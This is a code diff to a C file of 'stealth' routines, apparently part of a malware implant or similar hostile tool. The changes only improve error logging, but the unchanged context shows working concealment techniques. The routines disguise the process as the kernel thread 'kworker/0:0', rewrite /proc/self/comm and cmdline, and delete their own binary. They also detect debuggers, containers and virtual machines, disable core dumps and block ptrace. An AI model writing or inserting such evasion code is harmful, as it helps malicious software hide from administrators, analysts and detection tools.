@@ -64,18 +64,18 @@ void stealth_hide_process_name(void) {
     
     // Method 1: prctl (usually works)
     if (prctl(PR_SET_NAME, name) == -1) {
-        printf("[stealth] prctl failed (errno: %d)\n", errno);
+        printf("[stealth] prctl PR_SET_NAME failed: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     // Method 2: Try /proc/self/comm (often writable when cmdline isn't)
     int fd = open("/proc/self/comm", O_WRONLY);
     if (fd != -1) {
         if (write(fd, name, strlen(name)) == -1) {
-            printf("[stealth] /proc/self/comm write failed (errno: %d)\n", errno);
+            printf("[stealth] /proc/self/comm write failed: %s (errno: %d)\n", strerror(errno), errno);
         }
         close(fd);
     } else {
-        printf("[stealth] cannot open /proc/self/comm (errno: %d)\n", errno);
+        printf("[stealth] cannot open /proc/self/comm: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     // Method 3: Try /proc/self/cmdline (will likely fail on modern kernels)
@@ -84,12 +84,12 @@ void stealth_hide_process_name(void) {
     fd = open(cmd_path, O_WRONLY);
     if (fd != -1) {
         if (write(fd, name, strlen(name)) == -1) {
-            printf("[stealth] /proc/self/cmdline write failed (errno: %d)\n", errno);
+            printf("[stealth] /proc/self/cmdline write failed: %s (errno: %d)\n", strerror(errno), errno);
         }
         write(fd, "\0", 1);
         close(fd);
     } else {
-        printf("[stealth] /proc/self/cmdline not writable (errno: %d)\n", errno);
+        printf("[stealth] /proc/self/cmdline not writable: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     strncpy(current_stealth_name, name, sizeof(current_stealth_name) - 1);
@@ -109,13 +109,13 @@ void stealth_unlink_exe(void) {
             if (unlink(self_exe) == 0) {
                 printf("[stealth] unlinked temporary binary: %s\n", self_exe);
             } else {
-                printf("[stealth] failed to unlink %s (errno: %d)\n", self_exe, errno);
+                printf("[stealth] failed to unlink %s: %s (errno: %d)\n", self_exe, strerror(errno), errno);
             }
         } else {
             printf("[stealth] binary not in temp location, keeping: %s\n", self_exe);
         }
     } else {
-        printf("[stealth] cannot read /proc/self/exe (errno: %d)\n", errno);
+        printf("[stealth] cannot read /proc/self/exe: %s (errno: %d)\n", strerror(errno), errno);
     }
 }
 
@@ -225,12 +225,14 @@ BOOL stealth_check_debugger(void) {
             }
         }
         fclose(status);
+    } else {
+        printf("[stealth] cannot open /proc/self/status: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     // Check for ptrace
     if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
         if (errno != EPERM) {
-            printf("[stealth] ptrace detection triggered (errno: %d)\n", errno);
+            printf("[stealth] ptrace detection triggered: %s (errno: %d)\n", strerror(errno), errno);
             debugger_detected = TRUE;
         }
     } else {
@@ -283,6 +285,8 @@ BOOL stealth_check_debugger(void) {
             }
         }
         fclose(cgroup);
+    } else {
+        printf("[stealth] cannot open /proc/1/cgroup: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     // Check for VM
@@ -301,6 +305,8 @@ BOOL stealth_check_debugger(void) {
             }
         }
         fclose(cpuinfo);
+    } else {
+        printf("[stealth] cannot open /proc/cpuinfo: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     return debugger_detected;
@@ -314,12 +320,14 @@ void stealth_hide_network(void) {
         close(sock);
         printf("[stealth] raw socket created for network hiding\n");
     } else {
-        printf("[stealth] cannot create raw socket (errno: %d)\n", errno);
+        printf("[stealth] cannot create raw socket: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     // Try to hide from /proc/net/tcp by modifying process name
     // Kernel threads don't show network connections
-    prctl(PR_SET_NAME, "kworker/0:0");
+    if (prctl(PR_SET_NAME, "kworker/0:0") == -1) {
+        printf("[stealth] prctl PR_SET_NAME for network hiding failed: %s (errno: %d)\n", strerror(errno), errno);
+    }
     
     printf("[stealth] network hiding attempted\n");
 }
@@ -354,12 +362,12 @@ void stealth_disable_core_dumps(void) {
     // Disable core dumps via rlimit
     struct rlimit limit = {0, 0};
     if (setrlimit(RLIMIT_CORE, &limit) == -1) {
-        printf("[stealth] setrlimit failed (errno: %d)\n", errno);
+        printf("[stealth] setrlimit RLIMIT_CORE failed: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     // Also disable via prctl
     if (prctl(PR_SET_DUMPABLE, 0) == -1) {
-        printf("[stealth] prctl PR_SET_DUMPABLE failed (errno: %d)\n", errno);
+        printf("[stealth] prctl PR_SET_DUMPABLE failed: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     printf("[stealth] core dumps disabled\n");
@@ -395,11 +403,11 @@ void stealth_clear_argv(int argc, char **argv) {
 void stealth_disable_ptrace(void) {
     // Try to prevent ptrace attachment
     if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) {
-        printf("[stealth] PR_SET_NO_NEW_PRIVS failed (errno: %d)\n", errno);
+        printf("[stealth] prctl PR_SET_NO_NEW_PRIVS failed: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     if (prctl(PR_SET_DUMPABLE, 0) == -1) {
-        printf("[stealth] PR_SET_DUMPABLE failed (errno: %d)\n", errno);
+        printf("[stealth] prctl PR_SET_DUMPABLE failed: %s (errno: %d)\n", strerror(errno), errno);
     }
     
     printf("[stealth] ptrace protections enabled\n");
